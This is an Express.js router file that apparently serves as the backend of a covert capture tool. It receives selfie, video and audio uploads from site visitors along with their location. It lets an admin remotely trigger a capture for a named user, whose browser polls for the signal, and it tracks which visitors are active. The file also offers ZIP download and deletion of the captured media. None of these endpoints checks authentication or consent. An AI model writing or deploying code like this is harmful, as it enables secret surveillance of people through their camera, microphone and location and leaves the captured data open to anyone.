const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const router = express.Router();

const Capture = require('../models/Capture');
const ManualCaptureFlag = require("../models/ManualCaptureFlag");
const { saveCaptureData, getCaptureLogs } = require('../controllers/captureController');

const archiver = require("archiver");


const Access = require("../models/Access");


// Multer config for file uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/');
  },
  filename: function (req, file, cb) {
    const ext = path.extname(file.originalname);
    cb(null, `${file.fieldname}-${Date.now()}${ext}`);
  }
});
const upload = multer({ storage });

// 🟢 Save capture data
router.post('/capture-data', upload.fields([
  { name: 'selfie', maxCount: 1 },
  { name: 'video', maxCount: 1 },
  { name: 'audio', maxCount: 1 }
]), saveCaptureData);

// 🔵 Get all logs
router.get('/capture-data', getCaptureLogs);

// 🔴 Admin triggers capture
router.post('/manual-capture', async (req, res) => {
  const { username } = req.body;
  const userKey = username || `anonymous-${Date.now()}`;
  await ManualCaptureFlag.findOneAndUpdate(
    { username: userKey },
    { trigger: true },
    { upsert: true }
  );
  res.json({ message: `Manual capture triggered for ${userKey}` });
});

// 🟡 Client polls for capture trigger
router.get('/manual-capture-flag', async (req, res) => {
  const { username } = req.query;
  const userKey = username || "anonymous";
  const record = await ManualCaptureFlag.findOne({ username: userKey });

  if (record?.trigger) {
    await ManualCaptureFlag.updateOne({ username: userKey }, { trigger: false });
    return res.json({ trigger: true });
  }

  res.json({ trigger: false });
});

// DELETE ALL — MUST come first
router.delete("/capture-data/all", async (req, res) => {
  try {
    const captures = await Capture.find();

    for (const capture of captures) {
      const files = [capture.selfiePath, capture.videoPath, capture.audioPath];
      files.forEach(file => {
        if (file && fs.existsSync(file)) {
          fs.unlinkSync(path.resolve(file));
        }
      });
    }

    await Capture.deleteMany({});
    res.json({ message: "All logs and files deleted." });
  } catch (err) {
    console.error("❌ Delete all error:", err);
    res.status(500).json({ message: "Failed to delete all" });
  }
});

// DELETE SINGLE — keep this after
router.delete("/capture-data/:id", async (req, res) => {
  const { id } = req.params;
  try {
    const capture = await Capture.findById(id);
    if (!capture) return res.status(404).json({ message: "Log not found" });

    const filesToDelete = [capture.selfiePath, capture.videoPath, capture.audioPath];
    filesToDelete.forEach(filePath => {
      if (filePath && fs.existsSync(filePath)) {
        fs.unlinkSync(path.resolve(filePath));
      }
    });

    await Capture.findByIdAndDelete(id);
    res.json({ message: "Log and media files deleted successfully" });
  } catch (err) {
    console.error("❌ Delete error:", err);
    res.status(500).json({ message: "Failed to delete log" });
  }
});

// GET: Download a capture by ID as ZIP
router.get("/capture-data/:id/download", async (req, res) => {
  const { id } = req.params;
  try {
    const capture = await Capture.findById(id);
    if (!capture) return res.status(404).json({ message: "Capture not found" });

    res.set({
      "Content-Type": "application/zip",
      "Content-Disposition": `attachment; filename=capture-${id}.zip`
    });

    const archive = archiver("zip", { zlib: { level: 9 } });
    archive.pipe(res);

    // Add files if they exist
    if (capture.selfiePath && fs.existsSync(capture.selfiePath)) {
      archive.file(capture.selfiePath, { name: "selfie.jpg" });
    }
    if (capture.videoPath && fs.existsSync(capture.videoPath)) {
      archive.file(capture.videoPath, { name: "video.webm" });
    }
    if (capture.audioPath && fs.existsSync(capture.audioPath)) {
      archive.file(capture.audioPath, { name: "audio.webm" });
    }

    // Add metadata as JSON
    const meta = {
      username: capture.username || "—",
      triggeredBy: capture.triggeredBy,
      location: capture.location,
      createdAt: capture.createdAt
    };
    archive.append(JSON.stringify(meta, null, 2), { name: "metadata.json" });

    await archive.finalize();
  } catch (err) {
    console.error("❌ Download error:", err);
    res.status(500).json({ message: "Failed to download capture" });
  }
});


// 🟢 Log visit when user opens the site
router.post("/track-visit", async (req, res) => {
  const { username } = req.body;
  if (!username) return res.status(400).json({ message: "Missing username" });

  await Access.findOneAndUpdate(
    { username },
    { visitedAt: new Date() },
    { upsert: true }
  );

  res.json({ message: "Visit logged" });
});


// 🟢 Combined: Active users from Capture + Access within last 5 min
// 🟢 Combined Active Users (capture + visit)
router.get("/active-users", async (req, res) => {
  const now = new Date();
  const fiveMinAgo = new Date(now - 5 * 60 * 1000);

  const capturedUsers = await Capture.find({ createdAt: { $gte: fiveMinAgo } }).distinct("username");
  const visitedUsers = await Access.find({ visitedAt: { $gte: fiveMinAgo } }).distinct("username");

  const allUsers = new Set([...capturedUsers, ...visitedUsers]);

  res.json({ activeUsers: [...allUsers] });
});

module.exports = router;